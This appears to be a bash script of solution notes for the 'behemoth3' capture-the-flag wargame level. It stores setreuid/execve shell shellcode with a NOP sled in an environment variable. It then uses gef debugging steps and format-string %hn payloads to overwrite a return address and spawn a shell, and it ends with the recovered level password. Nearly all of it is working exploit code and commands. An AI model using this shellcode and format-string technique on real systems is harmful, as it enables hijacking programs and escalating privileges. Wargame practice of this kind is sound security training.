#!/bin/bash

cd /behemoth
export PYTHONIOENCODING=latin-1;export EGG=$(python3 -c "print('\x90'*5000 + '\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')");

gef behemoth3
disassemble main
b *main+95

# get the address of return address
# 0xffffbfbc│+0x0000: 0xf7da1cb9  →  <__libc_start_call_main+0079> add esp, 0x10 
run <<< $(python3 -c "import sys; sys.stdout.buffer.write(b'\xff\xff\xff\xff%65531d%5$hn\xff\xff\xff\xff%65531%1$hn')")

# get address of EGG
# $1 = 0xffffca51 '\220' <repeats 5000 times>, "j1X\231̀\211É\301jFX̀\260\vRhn/shh//bi\211\343\211\321̀"
p getenv("EGG")

# {address of return address}%{0xffff - 4}d%5$hn{address of return address + 2}%{0xca51 - 4}d%1$hn
run <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\xbc\xbf\xff\xff%65531d%5$hn\xbe\xbf\xff\xff%51789d%1$hn")')
# process 2381286 is executing new program: /usr/bin/dash

quit

/tmp/env-ballban EGG
# env address at 0xffffca41
/behemoth/behemoth3 <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\xac\xbf\xff\xff%65531d%5$hn\xae\xbf\xff\xff%51773d%1$hn")')


cat <(python3 -c 'import sys; sys.stdout.buffer.write(b"\xac\xbf\xff\xff%65531d%5$hn\xae\xbf\xff\xff%51773d%1$hn")') -| ./behemoth3


# password hpjUdlG723